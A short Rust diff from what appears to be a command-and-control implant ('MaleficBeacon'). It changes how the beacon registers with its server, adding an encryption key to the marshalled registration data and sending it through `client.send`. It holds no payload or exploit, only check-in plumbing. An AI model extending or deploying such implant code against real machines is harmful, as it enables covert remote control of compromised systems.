@@ -41,11 +41,12 @@ impl MaleficBeacon {
         })?;
 
         let data =
-            marshal_one(self.stub.meta.get_uuid(), self.stub.register_spite()).map_err(|_e| {
+            marshal_one(self.stub.meta.get_uuid(), self.stub.register_spite(), self.stub.meta.get_encrypt_key()).map_err(|_e| {
                 debug!("[beacon] Failed to register: {:#?}", _e);
                 return ();
             })?;
-        self.client.handler(transport, data)
+        
+        self.client.send(transport, data)
             .await
             .map_err(|_e| {
                 debug!("[beacon] Failed to send data: {:#?}", _e);
